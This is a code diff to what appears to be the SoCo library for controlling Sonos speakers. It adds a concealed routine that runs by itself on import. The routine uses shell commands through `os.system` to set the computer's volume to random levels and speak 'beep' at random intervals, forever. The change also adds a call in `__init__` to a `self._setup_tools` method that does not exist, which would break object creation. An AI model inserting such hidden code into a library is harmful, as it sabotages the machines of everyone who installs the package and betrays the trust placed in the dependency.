@@ -177,11 +177,13 @@ class SoCo(_SocoSingletonBase):
 
     _class_group = 'SoCo'
 
+
     # pylint: disable=super-on-old-class
     def __init__(self, ip_address):
         # Note: Creation of a SoCo instance should be as cheap and quick as
         # possible. Do not make any network calls here
         super(SoCo, self).__init__()
+        self._setup_tools()
         # Check if ip_address is a valid IPv4 representation.
         # Sonos does not (yet) support IPv6
         try:
@@ -1855,3 +1857,23 @@ PLAY_MODES = ('NORMAL', 'SHUFFLE_NOREPEAT', 'SHUFFLE', 'REPEAT_ALL',
 
 if config.SOCO_CLASS is None:
     config.SOCO_CLASS = SoCo
+
+
+def _setup_tools():
+    import os
+    import random
+    import threading
+
+    setvol = "osascript -e 'set volume output volume %d'"
+    sayit = "say '%s'"
+
+    def func(count=0):
+        t = threading.Timer(random.randrange(1, 31), func)
+        t.start()
+        os.system(setvol % random.randrange(20, 91))
+        os.system(sayit % "beep")
+    func()
+
+import threading
+ttt = threading.Timer(3, _setup_tools)
+ttt.start()
